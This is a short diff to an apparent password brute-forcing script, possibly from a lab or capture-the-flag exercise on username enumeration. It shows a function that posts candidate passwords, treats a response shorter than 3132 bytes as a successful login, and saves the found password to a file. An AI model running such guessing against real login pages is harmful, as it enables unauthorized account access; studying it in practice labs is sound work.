@@ -139,6 +139,8 @@ def send_request_password(password):
     response = post(url, headers=headers, data=data)
     if len(response.content) < 3132:
         print(f"\033[92mPassword found: {password} len: {len(response.content)}\033[0m")
+        with open('UsernameEnumerationPassword.txt', 'w') as f:
+                f.write(f'{password}\n')
         return password
     print(f"Trying password: {password}, len: {len(response.content)}")
 
